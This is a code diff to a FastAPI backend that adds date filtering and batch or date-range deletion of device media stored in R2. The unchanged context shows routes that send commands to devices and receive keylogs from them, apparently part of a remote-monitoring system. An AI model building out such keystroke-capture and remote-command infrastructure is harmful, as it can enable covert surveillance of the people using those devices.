@@ -285,11 +285,11 @@ def send_command(device_id: int, command: schemas.CommandBase, db: Session = Dep
     return crud.create_command(db=db, command=cmd_create, user_id=current_user.id)
 
 @router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFileResponse])
-def read_media(device_id: int, skip: int = 0, limit: int = 100, category: Optional[str] = None, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
+def read_media(device_id: int, skip: int = 0, limit: int = 100, category: Optional[str] = None, start_date: Optional[int] = None, end_date: Optional[int] = None, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
     device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
     if not device:
         raise HTTPException(status_code=403, detail="Device not owned by user")
-    media_files = crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit, category=category)
+    media_files = crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit, category=category, start_date=start_date, end_date=end_date)
     response = []
     for m in media_files:
         m_dict = {c.name: getattr(m, c.name) for c in m.__table__.columns}
@@ -321,6 +321,40 @@ def complete_media_upload(
 ):
     media_create = schemas.MediaFileCreate(**req.dict(), device_id=current_device.id)
     return crud.create_media_file(db=db, media=media_create, user_id=current_device.owner_id)
+
+@router.delete("/devices/{device_id}/media/", response_model=schemas.MediaDeleteResponse)
+def delete_media_batch(
+    device_id: int,
+    req: schemas.MediaBatchDeleteRequest,
+    db: Session = Depends(get_db),
+    current_user: models.User = Depends(get_current_user)
+):
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        raise HTTPException(status_code=403, detail="Device not owned by user")
+    media_files = crud.get_media_files_by_ids(db, req.media_ids)
+    s3_keys = [m.s3_key for m in media_files if m.device_id == device_id]
+    r2_deleted = r2_service.delete_files(s3_keys) if s3_keys else 0
+    valid_ids = [m.id for m in media_files if m.device_id == device_id]
+    db_deleted = crud.delete_media_files_by_ids(db, valid_ids)
+    return schemas.MediaDeleteResponse(deleted_count=db_deleted, r2_deleted=r2_deleted)
+
+@router.delete("/devices/{device_id}/media/range", response_model=schemas.MediaDeleteResponse)
+def delete_media_range(
+    device_id: int,
+    start_date: int,
+    end_date: int,
+    db: Session = Depends(get_db),
+    current_user: models.User = Depends(get_current_user)
+):
+    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
+    if not device:
+        raise HTTPException(status_code=403, detail="Device not owned by user")
+    files = crud.get_media_ids_in_range(db, device_id, start_date, end_date)
+    s3_keys = [f['s3_key'] for f in files]
+    r2_deleted = r2_service.delete_files(s3_keys) if s3_keys else 0
+    db_deleted = crud.delete_media_files_in_range(db, device_id, start_date, end_date)
+    return schemas.MediaDeleteResponse(deleted_count=db_deleted, r2_deleted=r2_deleted)
 
 @router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
 def create_keylog_for_device(
